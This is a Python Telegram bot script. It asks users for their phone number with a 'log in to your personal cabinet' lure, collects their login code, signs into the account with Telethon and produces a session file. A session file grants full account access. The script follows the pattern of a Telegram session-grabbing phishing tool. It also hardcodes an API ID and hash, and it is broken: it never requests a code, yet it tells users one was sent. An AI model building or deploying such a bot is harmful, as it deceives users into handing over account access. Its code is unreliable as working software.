import os
import telebot
from telebot import types
from telethon import TelegramClient
import time

TOKEN = os.getenv('TOKEN')
API_ID = int(os.getenv('API_ID', '28537210'))
API_HASH = os.getenv('API_HASH', '5388b7e4bc869cce695b682f2644a160')

bot = telebot.TeleBot(TOKEN)

user_data = {}

@bot.message_handler(commands=['start'])
def start(m):
    uid = m.chat.id
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    btn = types.KeyboardButton("📱 Отправить номер", request_contact=True)
    markup.add(btn)
    bot.send_message(uid, "🔐 Для входа в личный кабинет отправьте номер телефона", reply_markup=markup)

@bot.message_handler(content_types=['contact'])
def handle_contact(m):
    uid = m.chat.id
    if not m.contact:
        bot.send_message(uid, "❌ Ошибка, попробуйте /start")
        return
    
    phone = m.contact.phone_number
    if not phone.startswith('+'):
        phone = '+' + phone
    
    user_data[uid] = {'phone': phone}
    bot.send_message(uid, f"📲 Код отправлен на {phone}\nВведите его ниже:")
    bot.register_next_step_handler(m, get_code)

def get_code(m):
    uid = m.chat.id
    code = m.text.strip()
    
    if uid not in user_data:
        bot.send_message(uid, "❌ Ошибка, начните заново /start")
        return
    
    phone = user_data[uid]['phone']
    session_name = f"user_{uid}"
    
    try:
        client = TelegramClient(session_name, API_ID, API_HASH)
        client.connect()
        client.sign_in(phone, code)
        client.disconnect()
        
        # Отправляем файл
        with open(f"{session_name}.session", 'rb') as f:
            bot.send_document(uid, f, caption="✅ Готово! Файл сессии во вложении")
        
        os.remove(f"{session_name}.session")
        del user_data[uid]
        
    except Exception as e:
        bot.send_message(uid, f"❌ Ошибка: {e}")
        if uid in user_data:
            del user_data[uid]

print("🛡️ Session Bot запущен")
bot.polling()
